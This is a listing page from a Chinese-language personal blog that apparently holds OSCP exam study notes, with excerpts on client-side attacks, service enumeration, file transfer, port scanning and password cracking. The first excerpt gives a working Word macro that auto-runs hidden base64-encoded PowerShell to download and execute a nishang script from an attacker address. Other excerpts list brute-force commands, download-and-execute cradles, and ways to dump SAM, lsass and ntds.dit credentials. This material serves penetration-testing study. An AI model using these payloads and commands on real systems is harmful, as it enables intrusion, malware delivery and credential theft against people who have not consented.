<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Posts | 养猪日记</title>
<meta name=keywords content><meta name=description content="Posts - 养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=http://localhost:1313/posts/index.xml><link rel=alternate hreflang=en href=http://localhost:1313/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a></div><h1>Posts</h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>客户端攻击</h2></header><div class=entry-content><p>宏 后缀建议为doc或者docm
宏攻击代码：
Sub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() Dim Str As String Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY" Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5" Str = Str + "nKGh0dHA6Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKC" Str = Str + "g==" CreateObject("Wscript.Shell").Run Str End Sub 字符串base64编码内容： 配合nishang:
iex(new-object net.webclient).downloadstring("http://192.168.45.240/nishang.ps1") IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240/nishang.ps1') echo 'IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240/nishang.ps1') '|base64 py脚本分割：
str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGh0dHA6 Ly8xOTIuMTY4LjQ1LjI0MC9uaXNoYW5nLnBzMSkKCg==" n = 50 for i in range(0, len(str), n): print("Str = Str + " + '"' + str[i:i+n] + '"') 如果base64不行，不如直接明文：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;206 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 客户端攻击" href=http://localhost:1313/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>常见服务</h2></header><div class=entry-content><p>渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：
NFS 挂载： sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage showmount -d：仅显示已被NFS客户端加载的目录； -e：显示NFS服务器上所有的共享目录。 SSH 爆破 medusa -h ip -U 文件 -P 文件 -M 协议（ssh） 稳定 crackmapexec ssh ip -u username.txt -p passwd.txt --continue-on 可以使用排除法 ./cme -t 1 ssh hosts -u use_user -p pass hydra -L txt -P txt ip ssh 快 生成ssh公私钥 ssh-keygen -t rsa 上传文件名必须为：authorized_keys 连接问题 vim ~/.ssh/config HostKeyAlgorithms +ssh-rsa PubkeyAcceptedKeyTypes +ssh-rsa FTP ftp anonymous@ip prompt off 切换传输模式： binary ascii 开关被动模式： passive put get mget SMB 列出信息： smbclient -L \\\\{TARGET_IP}\\ -U 用户名 连接： smbclient //ip/目录 SMB扫描工具： enum4linux -a -o ip 挂载SMB： mount -t cifs //&lt;IP地址> 本地目录 sudo mount -t cifs -o username="qiu",password="password" //192.168.5.103/qiu smb 匿名挂载： sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' smb SMB罗列： smbmap -r 目录 -H ip 批量下载不用确认： prompt off 使用Kerberos协议登录smb: 在这种情况需要使用完全限定域名，格式为：hostname.domainname，同时，需要使用impacket工具包的smbclient.py： python ../impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.10.11.168 完全限定域名获取方式： https://github.com/CroweCybersecurity/ad-ldap-enum.git python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson 或者使用get-tgt获取票据，然后修改环境变量： sudo ntpdate -s 10.10.10.24 python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181 export KRB5CCNAME=svc_smb.ccache 爆破： hydra -l you -P（此处p为大写，大小写此处代表的意义不同）+字典路径 smb://+靶机ip enum4linux enum4linux -a -o www.harvard.edu 确定目录可写入： 先挂载在本地：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1137 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 常见服务" href=http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>文件传输</h2></header><div class=entry-content><p>1、kali web服务搭建
服务搭建： python2:python2 -m SimpleHTTPServer python3:python3 -m http.server php:php -S 0:80 2、kali 开启python接收http服务，靶机上传
import sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length = int(self.headers['Content-Length']) content = self.rfile.read(length) self.send_response(200) with open(self.path[1:], "w") as f: f.write(content) def run_on(port): print("Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...".format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ == "__main__": if len(sys.argv) &lt; 3: print("Usage:\n\tpython {0} ip 1337".format(sys.argv[0])) sys.exit(1) ports = [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server = Thread(target=run_on, args=[port_number]) server.daemon = True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print "\nPython HTTP PUT Server Stoped." sys.exit(1) kali开启：sudo python2 put.py ip 80 靶机上传: powershell 可能出错 curl --upload-file 20240128065938_BloodHound.zip http://10.10.16.4 wget --method=PUT --post-file=20240128065938_BloodHound.zip http://10.10.16.4/ 3、nc文件传输
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;275 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 文件传输" href=http://localhost:1313/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>端口扫描</h2></header><div class=entry-content><p>直连网络使用nmap进行扫描，非直连网络，先用Rustscan快速探测端口开放性，然后再搭建ligolo进行针对端口扫描，速度可以调到400-1000左右，测试顺利；
列出存活主机： nmap: Linux用脚本，Windows用arp-scan.exe nmap -sn 192.168.5.0/24 理论上-sn 会包含-PR nmap -PR 192.168.5.0/24 Linux: NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP &> /dev/null`; then echo -e "$NET$IP is \033[31mup\033[0m" ; else echo -e "$NET$IP is \033[32mdown\033[0m"; fi ; done 端口扫描： nmap: OSCP 网络不好，直连速度调1500，隧道速度调整为1000或者800，隧道情况下的扫描不可靠 sudo nmap -sT -p- -O -sV --min-rate 7000 -Pn 192.168.152.148 -oN tcp_nmap.txt sudo nmap -sU --top-ports 20 ip -oN udp_nmap.txt 筛选为适合漏洞扫描的格式 grep open tcp_nmap.txt | awk -F '/' '{print $1}'| paste -sd ',' sudo nmap -sC --script=vuln -p端口 ip -oN vuln.txt Linux: for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2>&amp;1; done | grep -v "Connection refused" for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done windows: NC： tcp扫描： nc -nvv -w 1 -z 192.168.50.152 3388-3390 UDP扫描： nc -nv -u -z -w 1 192.168.50.149 120-123 nmap 脚本 /usr/share/nmap/scripts grep Exploits /usr/share/nmap/scripts/*.nse AutoRecon https://github.com/Tib3rius/AutoRecon 扫描器，可自动调用 将要扫描的主机放到txt文件内： powershell 不推荐，垃圾 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://192.168.45.245:81/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 172.16.247.0/24 -T 4 -ports 1-10000 -ReadableOut cxk.txt" 端口范围： -Ports 1-10000 网段扫描： Invoke-Portscan -Hosts 192.168.1.1/24 -T 5 -TopPorts 25 -oA localnet Invoke-Portscan -Hosts 172.16.244.0/24 -T 5 -ports 1-10000 -ReadableOut cxk.txt [0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout) 5 {$nHosts=30; $Threads = 1000; $Timeout = 750 } 4 {$nHosts=25; $Threads = 1000; $Timeout = 1200 } 3 {$nHosts=20; $Threads = 100; $Timeout = 2500 } 2 {$nHosts=15; $Threads = 32; $Timeout = 3000 } 1 {$nHosts=10; $Threads = 32; $Timeout = 5000 } 加大强度，可能误报： Invoke-Portscan -Hosts 172.16.244.0/24 -Threads 2000 -nHosts 40 -Timeout 500 -ports 1-10000 -ReadableOut cxk2.txt ping扫描，建议APRscan Invoke-Portscan -Hosts 172.16.244.0/24 -PingOnly -ReadableOut PingOnly.txt 从文件中读取IP： Invoke-Portscan -HostFile hosts.txt -Threads 2000 -SkipDiscovery -nHosts 40 -Timeout 300 -ports 1-10000 -ReadableOut portscan.txt naabu 专注web https://github.com/projectdiscovery/naabu naabu -rate 500 -c 10 -s connect -p - -host 10.X.X.X -proxy 127.0.0.1:1080 文件落地的情况下： naabu.exe -p - -host 172.16.247.0/24 -o cxk.txt 参数详解： https://zhuanlan.zhihu.com/p/678578276 极端情况下： https://mp.weixin.qq.com/s/7Wc6furXUHfBfDeO3Zf7Qw ARP-scan-windows https://github.com/QbsuranAlang/arp-scan-windows- Rustscan 不如nmap，但是可以丢到目标主机执行 https://github.com/RustScan/RustScan 使用方式： rustscan.exe -a 10.10.136.140 -r 1-65535 > scan.txt 可能会卡住，但是多敲回车，主要是探测端口开放性，配合nmap做服务识别 nmap脚本会失效： -- -sV -sT > scan.txt 限制速度： --ulimit 1000 mascan 官方 https://github.com/robertdavidgraham/masscan 第三方 https://github.com/zan8in/masscan masscan.exe -p1-10000 172.16.234.0/24 --rate=5000 -oB scan.txt PORTS 列表，目前来看是代理情况下的最优解，配合ew 域内渗透的常见端口，加快扫描速度：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;357 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 端口扫描" href=http://localhost:1313/posts/oscp/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>隐藏信息获取&破解</h2></header><div class=entry-content><p>secret
图片信息查看： exiftool 查看图片基本信息 命令：exiftool main.gif steghide是一个图片或者音频文件的隐写工具 命令： 查看图片信息：steghide info xxx.jpg 提取文件：steghide extract -sf xxx 如果遇到加密的，可以使用stegseek进行爆破，命令如下： stegseek xx.jpg 字典路径 -xf 保存目录 二进制文件 file命令可以查看文件类型 xxd 是一个16进制dump工具，可用于查看文件的16进制内容： 命令： xxd -r -ps xxxx strings可用于查看文件可读字符串，pacp包也可以用这个查看 命令： strings xxx binwalk查看文件是否有捆绑 命令： binwalk xxx 破解压缩包密码： 7z2john backup.7z > hash3 john -wordlist=/usr/share/wordlists/rockyou.txt hash3 zip2john backup.zip > hashes john --wordlist=/usr/share/wordlists/rockyou.txt hashes zip： sudo hashcat -m 13600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 13600 .swp: vi/vim -r 破解hash 判断hash类型： hashid hash-identifier md5: hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 其他类型的hash查询： https://hashcat.net/wiki/doku.php?id=example_hashes 无线密码： aircrack-ng -w /usr/share/wordlists xx.cap shadow密码： john shadow --format=crypt --wordlist=/usr/share/xxx hashcat: https://blog.csdn.net/m0_43406494/article/details/116736263 修改shadow的文件，包括前面的名字，和后面的很多::的内容 hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 查看爆破成功的密码： hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show 密码生成 Crunch工具的使用方法： https://blog.csdn.net/qq_63844103/article/details/127979575 NTLM HASH获取 获取备份： reg save HKLM\sam sam.bak reg save HKLM\system system.bak 或者： C:\WIndows\System32\config\SAM C:\Windows\System32\config\SYSTEM 读取sam的hash: samdump2 SYSTEM SAM john破解nt hash 将上一步提取的hash保存为文件： john --wordlist=/user/xxx hash.txt --format=nt 证书提取 提取私钥 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes 提取公钥 openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem 直接申请TGT： gettgtpkinit.py https://wadcoms.github.io/wadcoms/PKINIT-gettgtpkinit/ 得提前配置kinit GPP密码解密 自动： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 手动： gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ VNC解密 echo -n 加密密码，去掉： | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 提取宏文件 提取文件： unzip Currency\ Volume\ Report.xlsm 宏文件通常为.bin结尾的哪个，使用strings读取即可 dump内存读取 pip3 install pypykatz pypykatz lsa minidump lsass.DMP ntds.dit密码获取 这个文件无法直接获取，正常情况下需要管理员权限，但是特殊情况下可以获取，比如BACKUP OPERATORS组用户： 参考： https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801 这个文件需要配合system.hive文件进行破解，获取方法： reg save HKLM\SYSTEM C:\system.hive 破解： python3 secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL 16进制转换成字符串： echo -n '6d2424716c5f53405f504073735730726421' | xxd -r -p msg格式文件读取 转换格式为eml: msgconvert *.msg 读取： xdg-open xx.eml hashcat 规则编写：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;337 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 隐藏信息获取&破解" href=http://localhost:1313/posts/oscp/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%A0%B4%E8%A7%A3/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=http://localhost:1313/posts/page/26/>«&nbsp;Prev&nbsp;
</a><a class=next href=http://localhost:1313/posts/page/28/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>